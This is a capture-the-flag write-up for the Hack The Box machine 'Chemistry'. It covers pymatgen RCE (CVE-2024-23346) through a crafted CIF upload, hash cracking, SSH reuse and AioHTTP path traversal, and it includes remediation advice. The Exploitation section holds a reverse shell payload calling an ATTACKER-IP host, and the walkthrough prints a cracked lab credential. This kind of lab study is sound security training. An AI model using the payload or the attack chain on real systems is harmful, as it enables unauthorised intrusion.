## Summary

Chemistry is an Easy Linux machine running a Flask **CIF Analyzer** web app. The
app parses uploaded CIF files with `pymatgen`, which is vulnerable to remote code
execution (CVE-2024-23346), yielding a reverse shell. A local SQLite database
exposes a password hash that, once cracked, grants SSH access as `rosa`. An
internal AioHTTP service exposed on localhost is then abused via path traversal
to read the **root** flag.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Chemistry | Easy | Linux | Hack The Box |

## Attack Path

1. Nmap reveals SSH and an HTTP service on port 5000.
2. The web application allows authenticated CIF file uploads.
3. A malicious CIF file exploits the pymatgen RCE (CVE-2024-23346).
4. A reverse shell is obtained on the server.
5. A local database file reveals a password hash.
6. The hash is cracked and reused for SSH access as `rosa`.
7. An internal service on localhost is reached through SSH tunneling.
8. A path traversal vulnerability is exploited to read the root flag.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A 10.10.11.38
```

| Port | Service |
| --- | --- |
| 22 | SSH |
| 5000 | HTTP (Python Flask) |

The web application hosted a **CIF Analyzer** used to upload and analyze
crystallographic files.

## Web Enumeration

The application exposed a login and registration system. After registering an
account, the dashboard allowed users to **upload CIF files**.

## Exploitation — pymatgen RCE (CVE-2024-23346)

The application uses the **pymatgen** library to process CIF files. The library
parses user input with `eval()`, allowing arbitrary code execution when a
crafted CIF file is parsed.

A malicious CIF file was created with a reverse shell payload:

```
system("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'")
```

After uploading the file and triggering the parser, a reverse shell was
received.

## Credential Discovery

Exploring the filesystem revealed a SQLite database containing stored
credentials.

```bash
cat database.db
```

The extracted hash was cracked offline, revealing:

```
rosa : unicorniosrosados
```

## Initial Access (User)

The recovered credentials were reused to authenticate over SSH as `rosa`.

```bash
ssh rosa@10.10.11.38
```

This provided the initial foothold on the system. The user flag lives at
`/home/rosa/user.txt`.

## Privilege Escalation

### Enumeration

Listing listening sockets revealed an internal service on `localhost:8080`.

```bash
netstat -nltp
```

An SSH tunnel was used to reach the service from the attacker machine.

```bash
ssh -L 8888:127.0.0.1:8080 rosa@10.10.11.38
```

### Path Traversal (AioHTTP)

The internal application (running as root) was vulnerable to **path traversal**,
allowing arbitrary file reads. This was abused to read the root flag directly
from `/root/root.txt`.

## Vulnerability Analysis

**Remote Code Execution in pymatgen (CVE-2024-23346)** — the app parsed uploaded
CIF files with pymatgen, which processed input through `eval()`, enabling
arbitrary code execution and the initial foothold. Fix: upgrade pymatgen, never
pass untrusted input to `eval()`, and sandbox file-parsing routines.

**Path Traversal in the internal AioHTTP service** — an internal web application
running as root allowed directory traversal, exposing arbitrary files including
the root flag. Fix: normalize and validate requested paths, restrict the served
root, and run the service unprivileged.

## Tools Used

- Nmap
- Netcat
- SSH
- Hash cracking tools
- Burp Suite

## Key Takeaways

- File upload features that parse complex formats can hide RCE in their parsing libraries.
- Insecure use of `eval()` in dependencies is a recurring, high-impact bug.
- Local databases often store crackable credential hashes.
- Internal services bound to localhost are still reachable after a foothold via tunneling.
